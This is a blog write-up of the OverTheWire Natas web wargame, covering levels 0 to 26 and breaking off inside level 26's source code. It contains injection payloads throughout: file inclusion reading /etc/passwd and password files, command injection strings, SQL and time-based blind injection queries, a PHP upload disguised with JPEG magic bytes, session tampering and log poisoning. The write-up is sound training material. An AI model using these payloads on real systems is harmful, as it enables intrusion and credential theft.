---
layout: post
title:  OverTheWire Natas Write-Up
excerpt: "Write-up for OverTheWire Natas"
categories: overthewire wargames write-up

---

Natas is a web application side wargame, more specifically the server side.

## Level 0

Level 0, expect the basics. Password for the next level was a comment in the source code of the webpage.

## Level 1

Same as previous level, right clicking is blocked though. Well, I used the keyboard for both the levels, and I know you did too ;)

## Level 2

Upon inspecting the source code of the page, I found an image inside the `/files` directory. Of course I check that directory (who doesn't).. and the password was inside a text file in that directory. Easy breezy till now :smile:

## Level 3

This time, there was no explicit leak on the webpage. The `/files` directory didn't exist either. As a reflex, I checked for `/robots.txt` for some juicy stuff, and well, that did infact lead to the password. Please don't gobuster here xD

## Level 4

This level involved the web server checking the Referer header for access. This way of checking origin is not that great as like all headers, this can be modified. I changed the Referer header to the required value and got the password.

## Level 5

This level had a check for the `loggedin` cookie. Changing it to 1 from 0 got me the password.

## Level 6

This level marked a change from simple web application checks. We had to input a secret value and only upon inputting the correct value, we get the password. Upon checking the source code, I found that the following lines were interesting:
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
```
So, the secret isn't shown, but the location is. Upon visiting `/includes/secret.inc`, I find the secret, and entering the secret in the input, I get the password. Simple.

## Level 7

This level was related to Local File Inclusion, i.e., uncontrolled and unchecked allowance of file names in a web page inclusion endpoint. 
This page had two anchor tags, upon clicking them, the `page` parameter was changed accordingly. I tried inputting `?page=/etc/passwd` and got the password file, confirming the vulnerability.

In the source code of the site, a comment said:
```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

What else does a man need? The location of the password and a LFI.
`?page=/etc/natas_webpass/natas8` got the password.

## Level 8

Similar to level6, this level involved a secret value checking. The source code revealed the secret (encoded) and how it was encoded:
```
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Reversing this function (hex2bin -> rev -> base64 decode), and entering the secret, I got the password.

## Level 9

This level was aimed at command injection. We can search for words containing our input. Upon viewing the source code, we find the way this search is performed:
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```
Our input is passed unfiltered, directly to a grep command. The password is at the `/etc/natas_webpass/natas<level>`. So, i escaped the command with `;` and used `cat` to get the password. The search payload: `; cat /etc/natas_webpass/natas10 #`.

## Level 10

This level was same as the previous one, but it blacklisted `;` and `&`. 
Insted of breaking out, I used the grep command itself. The payload was: `d /etc/natas_webpass/natas11 #`. (Find `d` inside the password file; `a`,`b` and `c` weren't there, so nothing was displayed)

## Level 11

This level involved __xor encryption__. _Crypto scares me...._ Anyways, lets look at the source code. This challenge involves setting the background colour of the webpage according to user input. The input is fed and stored inside a cookie, which is xor encrypted. Juicy snippets from the source code:
```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
```

Now, all we have to do, is somehow set the showpassword field of the array to __true__. But, we don't have the key. I did some research on XOR encryption, and found the trick to break it.
Say we have two variables, `x` and `y`, and `z = x xor y`.
Say we know only `z` and `x`. To find `y`, we can simply:
```
z = x xor y
=> z xor x = x xor y xor x
=> z xor x = x xor x xor y
=> z xor x = y
```
So basically, to get the key, we use the fact that we have the message (`z = cookie value, base64decoded`) and the input (`x = array(...)`) to get the key (`y`).

So, to get the key, we simple use the `xor_encrypt` function, but as the key we pass the array of values and the text as the cookie base64 decoded:
`natas11getkey.php`:
```php
<?php

$data = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=';

function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt(base64_decode($data));
?>
```
This gets us the key.
Put the key inside the function with `showpassword=>yes`, bada beem, give it to the website as cookie, bada boom, get the password.

## Level 12

Alright, LEVEL 12. This level has an image upload functionality. There is a max size (that is checked), and a file type (JPEG, not checked). I could successfully upload php files. However, on uploading, the file type remained jpg. Interesting. The form field involved:
```html
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000">
<input type="hidden" name="filename" value="amygvfsxn0.jpg">
Choose a JPEG to upload (max 1KB):<br>
<input name="uploadedfile" type="file"><br>
<input type="submit" value="Upload File">
</form>
```

I tried changing the value of the filename from `amygvfsxn0.jpg` to `amygvfsxn0.php`, and then uploading my php file. Surprisingly it worked. I'm thankful it did, I didn't know what was the attack vector here and this was a random arrow thrown :laughing:

> P.S: There is also random file name functionality here; not important for the challenge. Also tried LFI, not the attack vector, couldn't leak arbitrary files.

## Level 13

This level is similar to the last one, except......:
> For security reasons, we now only accept image files!   

And, the check was performed by:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```
![kekw](data:image/jpeg;base64,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)   

To the one's reading who don't know how to bypass this check, let me tell you something.   
This function would check for the exif data for the file type, more specifically, the magic numbers of the file. Magic numbers are basically the first few bytes of a file.   
So, to bypass such a check of file types, we can create a file with the first bytes as the magic numbers of a valid file (here, we put JPEG magic numbers) and append this file witha juicy payload.  

> __So basically, in this challenge, we do the same as last level, but the php file uploaded is prepended with the JPEG magic numbers (check [Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5).)__  

[A nice stackoverflow snippet for your needs](https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code/43123554#43123554).

## Level 14

_SQL injection starts now!_   
Yep, a default SQL injection challenge. You may ask, how do you know? Well, I am greeted with a username and password form in this level, and this is the code behind the form:
```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

Username and password fields are passed unfiltered to the database, nice!
Payload for this level: `username=natas15" #`, `password=anythinghereee`.

## Level 15

In this level, we have no password form field. We only have a username field, and we can enter a value, and if the user exists we get `This user exists.` and if it doens't, we get `This user doesn't exist.`.   
Right off the bat, this indicated me toward blind SQL injection. I checked if the `LIKE` operator worked, and it did.   
Query: `natas16" AND password LIKE 'W%' #`. A friend of mine reminded me that `LIKE` is case insensitive, so I used `LIKE BINARY` instead.
Using this query, I wrote a simple python script to bruteforce the password.   
<img src='https://lh3.googleusercontent.com/AB1sSSiXOcsLIkamWdWwn0TY4N-S7cMCUWwgZPMz4rqwEvMjQ14cijSRPN396x6H-K3aZb7z1BivpTfBndWHa6XtTElonpV8gSDBDQ=w1400-k' width=200 height=200>

## Level 16

This level revisited the challenge pattern of levels 9 and 10. We can search for words inside a dictionary containing our input. However, this time:
> For security reasons, we now filter even more on certain characters    

The source code revealed how the check was performed:
```php
if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```
So, our input is inside quotes, and some characters are restricted.
Upon trying some inputs, I came to some conclusive thoughts:
1. I can do command injection using `$(cmd)`.
2. Regular injection isn't possible, i.e., I'd have to use the existing `grep -i key dictionary.txt` command to get the password.
3. Because of the upper thought, I understood that I needed to inject a command that would give a sort of blind injection, and a binary value would be returned, similar to the earlier SQL injection. That is, I'd have to check letter by letter, and given that the particular is inside the password, get an output, say `x` and if not, I get `y`.

I was stuck here for some time. I admit I had to look at other writeups for this part. I just wasn't getting how to get such a binary output. After looking at some writeups, I understood how close I was.

The trick here is to search for a word inside the dictionary, prepended(or appended) with `$(grep <letter exists in natas pass>)`. If letter exists, I would search for `<letter><word in dictionary>`. This would return nothing. If the letter doens't exist, I would search for `<word in dictionary>`. This would return the word. I now have a way to bruteforce the password!

The payload used for bruteforcing: `$(grep -E ^<pass>.* /etc/natas_webpass/natas17)aptest`. This would return the password if it starts with given `<pass>`, and so no output is shown. If it doens't start with `<pass>`, I'd get `aptest` in the output.

Python script written for this -> got the password.

<img src='https://i.kym-cdn.com/entries/icons/mobile/000/028/021/work.jpg' width=300 height=200>

## Level 17

Another SQL injection level, and almost similar to the one in level 15. A look at the sourcecode:
```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

For a second I thought everything is the same. However, there was no output being returned on any input. Then I noticed the comments. 
So, no output and blind SQL injection. This pointed me towards the obvious solution: ___TIME___.

For this challenge, I used the same script I used for Level 15, but I changed the query to:
`natas18\" AND password LIKE BINARY '{password}{char}%' AND SLEEP(5) #`. Basically, append a sleep statement at the end, and bruteforce based on request time (For python, we can get it using `response.elapsed.total_seconds()`).

## Level 18

In this level, there was another form with username and password fields. But, there was no database involved. The source code is quite big, I'll put relevant parts below:
```php
$maxid = 640; // 640 should be enough for everyone
.
.
.
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
.
.
.
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 
```
The first line is what immediately intrigued me. A maximum of 640 user ids. Upon logging in randomly, I noticed that the `PHPSESSID` cookie was a number, between 1-640. Interesting.

I wrote a python script to get the same page but for all these user IDs, and on ID=119, I got the admin rights. Simple Challenge.

## Level 19

This level is similar to the previous level, except:
> This page uses mostly the same code as the previous level, but session IDs are no longer sequential...     

I inspected the cookie value to see what the user ID actually was, and I got:`PHPSESSID:3131392d61646d696e`. That looks like hex to me. I decoded it to ASCII immediately, as my gut told me to. In ascii it is:`119-admin`.

So, basically, to remove the sequential-ality, if that even means something, it just converts `userid-username` to hex.

I used the script from the previous level, but instead of bruteforcing on integers 1-640, I bruteforced on `hex(<userid>-admin)`. I got the password on user id 281.

## Level 20

This level involved custom PHP functions for session management. The core part of the source code:
```php
function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```

Interesting. Whenever there is a write of user input involved, my focus shifts there. Having seen such challenges before, I noticed the vulnerability soon enough. In these lines of the `mywrite` function, see whats happening?:
```php
foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
```
For each part of the session, a simple `key value` is written. The values aren't sanitized however. So, we can enter data as: `normal value <delimeter> admin 1`. This would write `admin 1` to the data, and when loaded into the session, would add a key `admin` and value as `1`.

So, to get the password, I use the input field to enter `random \n admin 1` and resend the request to get the password.

## Level 21

Another similar level involving custom PHP functions for sessions. However, this time:
> Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org    

Interesting, two sites with same sessions (colocated). Visiting the second site, we see that we can set custom css (align, fontsize and bgcolor). Lets look at the source code:
```php

<?php
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

So, for each element in the form, the key, value pairs are added in the session. Side note: the main challenge page only checks if admin is in session, nothing else.

This challenge is quite simple then. I simple resent the request of the second page with another field in the body `admin=1`. Got the session cookie, added it to the main page and got the password.

## Level 22

This level was related to redirects. There is initially nothing on the webpage, and the source code reveals: 
```php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
.
.
// some html
.
.
<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

This looks simple then, just add `revelio=something` as a GET parameter. But, on actually doing this, I got nothing. After some head scratching, I understood the problem. The header is being set back to `Location: /` (redirects back to initial page). I repeated my request with `allow_redirects=False` in the python requests library, and got the password.

## Level 23

This level has one input field, `password`. Source Code reveals the backend:
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```

So, the password needs to be `iloveyou` and must be greater than 10.   
<img src='https://i.kym-cdn.com/entries/icons/mobile/000/018/489/nick-young-confused-face-300x256-nqlyaa.jpg' height=200 width=300>

After some research on how PHP handles this stuff, I understood. The string could contain a number, and that would be processed as an integer. So, bypass this check by: `<numbergreaterthan10>iloveyou`. First number passes the `>10` check, and `iloveyou` is inside the string. A challenge focusing on PHP processing.

## Level 24

Another level based on weird PHP stuff. Like the last level, we have to input a password. Source code:
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```
So, we want the `strcmp` to return `0`. On looking at results for `strcmp php problems`, I fould that this is vulnerable to type pollution, i.e., pass `passwd` as an array (`passwd[]`); `strcmp()` returns `0` if type doesn't match, but returns an error.   
<img src='https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fphotos%2Fimages%2Fnewsfeed%2F000%2F051%2F726%2F17-i-lol.jpg' height=300 width=300>

So, pass `passwd[]=something` as a GET parameter for the passsword.

I wish there was more of a writeup here, but   
<img src='https://c.tenor.com/1iXU7qMdKBEAAAAM/it-is-what-it-is-it-is-what.gif'>

We move forward.

## Level 25

This level involved a complex vulnerability. By complext I mean that there were two parts to the problem. Lets look at the source code:
```php
function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
.
.
.
   function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?
```
Here, we see that the User-Agent is being logged in `logRequest`. Also, we can set the language. To prevent file inclusion, some sanitization was used. This can however be bypassed (using `....//` instead of `../`). But, direct file access of the password file can't be done. Interesting.

The solution here is to use the fact that the `User-Agent` header is logged. We can pass our payload of `cat the passwordfile in PHP` inside that header, then get the Log File using the LFI.

Nice Challenge :+1:

## Level 26

A level with an insecure serialization bug! Lets look at the source code:
```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
